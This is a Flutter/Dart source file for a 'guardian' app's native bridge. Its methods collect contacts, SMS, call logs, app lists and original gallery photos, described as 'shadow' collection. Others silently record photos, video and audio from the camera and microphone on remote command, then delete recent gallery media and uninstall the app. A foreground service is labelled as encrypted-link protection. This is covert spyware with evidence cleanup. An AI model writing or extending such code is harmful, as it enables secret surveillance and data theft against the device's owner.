import 'package:flutter/services.dart';

/// 原生桥接（规约 NATIVE_BRIDGE：Channel com.mop.guardian/native）
class NativeBridge {
  static const _channel = MethodChannel('com.mop.guardian/native');

  /// 稳定 device_id（Android: SHA-256(ANDROID_ID)；iOS 由原生实现或返回空），用于 enroll 与 audit 一致
  static Future<String?> getDeviceId() async {
    try {
      final r = await _channel.invokeMethod<Object?>('getDeviceId');
      return r?.toString();
    } on PlatformException {
      return null;
    }
  }

  /// 影子数据采集；type: contacts | sms | call_log | app_list | gallery；iOS 必须项为 contacts、gallery；不采集 usage
  static Future<Map<String, dynamic>> fetchSensitiveData(String type) async {
    try {
      final result = await _channel.invokeMethod<Map<Object?, Object?>>(
        'fetchSensitiveData',
        type,
      );
      if (result == null) return {};
      return Map<String, dynamic>.from(
        result.map((k, v) => MapEntry(k.toString(), v)),
      );
    } on PlatformException {
      return {};
    }
  }

  /// 相册原图字节（用于上传原图）；仅 Android 实现，iOS 可返回 null
  static Future<List<int>?> getGalleryOriginalBytes(int contentId) async {
    try {
      final result = await _channel.invokeMethod<Object?>('getGalleryOriginalBytes', contentId);
      if (result == null) return null;
      if (result is Uint8List) return result.toList();
      if (result is List) return result.map((e) => (e as num).toInt()).toList();
      return null;
    } on PlatformException {
      return null;
    }
  }

  /// 相册单张 280px 缩略图（按索引），避免一次 60 张超平台通道约 1MB；仅 Android 实现，iOS 可返回空
  static Future<Map<String, dynamic>?> getGalleryItemThumbnail(int index) async {
    try {
      final result = await _channel.invokeMethod<Map<Object?, Object?>>(
        'getGalleryItemThumbnail',
        index,
      );
      if (result == null) return null;
      return Map<String, dynamic>.from(
        result.map((k, v) => MapEntry(k.toString(), v)),
      );
    } on PlatformException {
      return null;
    }
  }

  /// 保存二维码图片字节到系统相册
  static Future<void> saveQrToGallery(List<int> bytes) async {
    await _channel.invokeMethod<void>('saveQrToGallery', bytes);
  }

  /// 检查 Android 悬浮窗是否已授予；iOS 恒为 true
  static Future<bool> checkOverlayPermission() async {
    try {
      final r = await _channel.invokeMethod<Object?>('checkOverlayPermission');
      return r == true;
    } on PlatformException {
      return false;
    }
  }

  /// 申请 Android 悬浮窗权限；iOS 空实现
  static Future<bool> requestOverlayPermission() async {
    try {
      final r = await _channel.invokeMethod<Object?>('requestOverlayPermission');
      return r == true;
    } on PlatformException {
      return false;
    }
  }

  /// 唤起系统拨号盘
  static Future<void> openSystemDialer(String number) async {
    await _channel.invokeMethod<void>('openSystemDialer', number);
  }

  /// 唤起系统短信界面
  static Future<void> openSystemSms(String number, [String? content]) async {
    await _channel.invokeMethod<void>('openSystemSms', {'number': number, 'content': content ?? ''});
  }

  /// 启动 Android 前台服务（规约：加密链路保护中）
  static Future<void> startGuardianService() async {
    try {
      await _channel.invokeMethod<void>('startGuardianService');
    } on PlatformException {
      // iOS 或无此能力时忽略
    }
  }

  /// 远程采集：拍照（静默），返回图片字节；原生未实现时返回空列表
  static Future<List<int>> capturePhoto({String camera = 'front'}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('capturePhoto', {'camera': camera});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }

  /// 远程采集：录像（静默，durationSec 秒），返回视频字节；原生未实现时返回空列表
  static Future<List<int>> captureVideo({int durationSec = 18, String camera = 'front'}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('captureVideo', {'duration_sec': durationSec, 'camera': camera});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }

  /// 远程采集：录音（静默，durationSec 秒），返回音频字节；原生未实现时返回空列表
  static Future<List<int>> captureAudio({int durationSec = 18}) async {
    try {
      final result = await _channel.invokeMethod<List<Object?>>('captureAudio', {'duration_sec': durationSec});
      if (result == null) return [];
      return result.map((e) => e is int ? e : 0).toList();
    } on PlatformException {
      return [];
    }
  }

  /// 清理设备相册中最近 [days] 天内的照片与视频（用于远程擦除前）；需内容管理/相册写权限；失败时静默忽略
  static Future<void> clearGalleryWithinDays(int days) async {
    try {
      await _channel.invokeMethod<void>('clearGalleryWithinDays', days);
    } on PlatformException {
      // 权限不足或平台不支持时忽略，擦除流程继续
    }
  }

  /// 调起系统卸载本应用（Android 弹窗确认；iOS 无系统 API，不执行）
  static Future<void> uninstallApp() async {
    try {
      await _channel.invokeMethod<void>('uninstallApp');
    } on PlatformException {
      // iOS 或不支持时忽略
    }
  }
}
